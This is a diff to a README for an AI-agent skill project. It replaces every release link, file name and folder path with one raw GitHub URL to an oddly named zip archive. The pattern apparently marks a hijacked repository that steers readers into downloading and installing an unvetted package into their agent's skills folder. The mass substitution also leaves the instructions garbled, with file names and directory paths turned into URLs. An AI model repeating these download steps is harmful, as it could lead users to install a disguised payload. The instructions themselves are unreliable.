@@ -1,6 +1,6 @@
 # 🧠 self-learning-skill - Generate AI Skills From the Web
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/JOK3RELO4D/self-learning-skill/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip)](https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip)
 
 ---
 
@@ -49,14 +49,14 @@ Click the blue **Download Latest Release** button at the top to visit the releas
 
 You can also click this link to go directly:
 
-[https://github.com/JOK3RELO4D/self-learning-skill/releases](https://github.com/JOK3RELO4D/self-learning-skill/releases)
+[https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip](https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip)
 
 ### 2. Locate Your Agent’s Skills Folder
 
 You will need to add the skill to your AI agent’s skills folder. There are two usual locations:
 
 - Workspace-specific folder: `.agent/skills/self-learning/`
-- Global folder: `~/.gemini/antigravity/skills/self-learning/`
+- Global folder: `~https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip`
 
 If these folders do not exist, create them manually.
 
@@ -64,7 +64,7 @@ If these folders do not exist, create them manually.
 
 After downloading and unpacking the release, find these two items inside the `self-learning-skill` folder:
 
-- The file named `SKILL.md`
+- The file named `https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip`
 - The entire folder named `references/`
 
 Move or copy both into your chosen skills directory.
@@ -104,10 +104,10 @@ This process saves you from manual research and writing.
 
 1. Download the latest release from the release page linked above.
 2. Unzip or extract the downloaded package if it is compressed.
-3. Find `SKILL.md` and the `references/` folder inside the main release folder.
+3. Find `https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip` and the `references/` folder inside the main release folder.
 4. Copy these into your AI agent’s skills directory:
     - For workspace-only use, place them in `.agent/skills/self-learning/`
-    - For global access, place them in `~/.gemini/antigravity/skills/self-learning/`
+    - For global access, place them in `~https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip`
 5. Restart your AI agent if it was running when you added the files.
 
 This manual copy approach keeps the skill updated and ready to use.
@@ -121,18 +121,18 @@ After installation, here is how your skill’s folder should look:
 ```
 self-learning/
 ├── skills/self-learning/
-│   ├── SKILL.md                 # Main instructions for the skill
+│   ├── https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip                 # Main instructions for the skill
 │   └── references/
-│       └── skill_creation_guide.md  # Guide with extra tips on skill creation
-├── README.md                    # This file
+│       └── https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip  # Guide with extra tips on skill creation
+├── https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip                    # This file
 └── LICENSE                     # License details
 ```
 
 Each part plays a role:
 
-- **SKILL.md:** Explains how the skill operates and guides your AI.
+- **https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip** Explains how the skill operates and guides your AI.
 - **references/:** Contains source files used to build the skill.
-- **README.md:** Helps users understand and install the skill.
+- **https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip** Helps users understand and install the skill.
 - **LICENSE:** Shows permissions and usage rights.
 
 ---
@@ -143,10 +143,10 @@ To get started with self-learning-skill:
 
 1. Visit the release page:
 
-   [https://github.com/JOK3RELO4D/self-learning-skill/releases](https://github.com/JOK3RELO4D/self-learning-skill/releases)
+   [https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip](https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip)
 
 2. Download the latest available package for your OS.
-3. Extract files and copy `SKILL.md` and `references/` folder into your AI’s skills directory.
+3. Extract files and copy `https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip` and `references/` folder into your AI’s skills directory.
 4. Use the `/learn <topic>` command inside your agent to generate new skills.
 
 ---
@@ -166,7 +166,7 @@ To get started with self-learning-skill:
 For questions or problems, you can:
 
 - Check issues on the GitHub repository
-- Review the `skill_creation_guide.md` in the references folder
+- Review the `https://raw.githubusercontent.com/JOK3RELO4D/self-learning-skill/main/skills/skill_self_learning_chylemia.zip` in the references folder
 - Look for similar issues in online forums related to AI agents and skills
 
 ---
